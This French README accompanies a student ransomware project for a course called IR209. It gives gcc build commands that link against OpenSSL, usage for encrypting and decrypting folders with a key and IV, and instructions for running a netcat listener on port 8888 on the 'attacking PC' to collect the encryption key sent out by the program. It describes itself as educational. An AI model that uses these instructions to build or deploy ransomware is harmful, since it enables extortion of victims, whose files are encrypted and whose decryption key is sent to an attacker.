Ransom (pour ransomware) est un programme réalisé pour le cours de dévelopement IR209. 
Il à pour but de présenter le fonctionnement d'un rasomware dans le cadre de la compéhension la sécurité informatique mais du point de vue d'un attaquant.

Son utilisation est donc à des fins éducatives.
#isntalation et modification requise

Dans le code ransom.c, pensez à changer l'adresse IP de la machine où envoyé la clé

Pensez à installer netcat si vous ne l'avez pas sur votre ordinateur.

#compilation :

Pour compiler les codes "ransom.c" et "ransomlib.c", il est conseiller d'utiliser les package GCC. Vous pouvez le compiler de la façon suivante:

```bash
gcc -o ransomware.exe ransom.c ransomlib.c -lcrypto
```

L'utilisation de -lcrypto va lier les deux codes à la librairie crypto créer au téléchargement d'openssl. 
Si vous ne l'avez pas, vous pouvez utiliser la commande suivante 

```bash
apt-get install libssl-dev
```

#L'utilisation

Une fois le programme compiler, vous pouvez bouger le programme dans un dossier courant comme /usr/local/bin pour le lancer grâce à la focntion ./ransomware.exe. 
Voici l'utilisation du programme : 

```bash

- Chiffrement d'un dossier/fichier
./ransomeware.exe [Dossier/fichier]

- Déchiffrement d'un dossier/fichier
./ransomware.exe [Dossier/fichier] -d [KEY] [IV]

sur le PC attanquant, ouvrer un netcat avec la commande suivante

nc -l -p 8888

celui si va écouter sur le port 8888 pour récupérer la clé de chiffrement et le vecteur d'initialisation

```

Dans le cas ou le programme c'est lancé correctement, les fichiers à l'intérieur du dossier donné en paramètre seront bien chiffré ou déchiffrer.
Si ce n'est pas le cas, il faut vérifier la sortie d'erreur. /!\ Une limite de taille à été mise (1Gb).
L'erreur peut donc venir soit de la limite, soit si le fichier porte déjà l'extension .Pwnd. 
L'autre erreur est dans le cas ou il n'y a aucun serveur qui écoute pour récupérer la clé. 

